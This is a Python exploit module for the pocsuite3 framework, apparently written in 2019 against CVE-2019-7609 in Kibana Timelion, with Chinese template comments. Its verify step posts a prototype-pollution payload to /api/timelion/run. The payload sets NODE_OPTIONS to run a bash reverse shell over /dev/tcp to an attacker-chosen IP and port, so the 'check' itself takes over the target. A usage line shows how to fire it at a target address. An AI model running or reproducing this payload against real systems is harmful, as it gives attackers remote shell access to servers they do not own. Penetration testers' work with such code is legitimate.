#! python3
"""

@FileName: elasticsearch_kibana_rce.py
@Author: dylan
@software: PyCharm
@Datetime: 2019-10-20 15:23:54

"""
import re
from collections import OrderedDict
import json
import urllib.parse
from bs4 import BeautifulSoup
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString, logger


class DemoPOC(POCBase):
    vulID = "CVE-2019-7609"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "3.0"  # 默认为1
    author = "dylan"  # PoC作者的大名
    vulDate = "2019/10/20"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019/10/20"  # 编写 PoC 的日期
    updateDate = "2019/10/20"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/jas502n/kibana-RCE"]  # 漏洞地址来源,0day不用写
    name = "elasticsearch_kibana_rce"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "elasticsearch_kibana"  # 漏洞应用名称
    appVersion = "Kibana < 6.6.1,Kibana < 5.6.15"  # 漏洞影响版本
    vulType = "rce"  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = """
        Need Timelion And Canvas
    """  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = """
    pocsuite -r "elasticsearch_kibana_rce.py" -u 目标ip --ncip "监听ip" --ncport "监听端口"

    pocsuite -r "elasticsearch_kibana_rce.py" -u https://192.168.1.1 --ncip "192.168.1.1" --ncport "12345"
    """

    def _options(self):
        o = OrderedDict()
        o["ncip"] = OptString('', description='请输入监听服务器IP', require=True)
        o["ncport"] = OptString('', description='请输入监听服务器端口', require=True)
        return o

    def _verify(self):
        # 验证代码
        result = {}
        output = Output(self)
        kibana_path = self.url+"/app/kibana"
        path1 = self.url + "/app/timelion"
        print(path1)
        path2 = self.url + "/api/timelion/run"
        payload = {
            "sheet": [
                ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& "
                "/dev/tcp/" + self.get_option("ncip") + "/" + self.get_option(
                    "ncport") + " 0>&1\");process.exit()//')\n.props("
                                "label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],
            "time": {"from": "now-15m", "to": "now", "mode": "quick", "interval": "auto",
                     "timezone": "Asia/Shanghai"}
        }
        resp = requests.get(kibana_path, verify=False, timeout=20)
        kbn_version = ''
        try:
            kbn_version = resp.headers['kbn-version']
        except Exception as e:
            logger.info(e)

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
            'Accept': 'application/json, text/plain, */*',
            "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            'Connection': 'close',
            'kbn-version': kbn_version,
            'Content-Type': 'application/json;charset=UTF-8'
        }

        respose2 = requests.post(path2, headers=header, data=json.dumps(payload), verify=False, timeout=30)
        # print(respose2.status_code)
        if respose2.status_code == 200 and 'invokeTime' in respose2.text:  # result是返回结果
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = ""
        return self.parse_output(result)

    def _attack(self):
        # 攻击代码
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("target is not vulnerable")
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)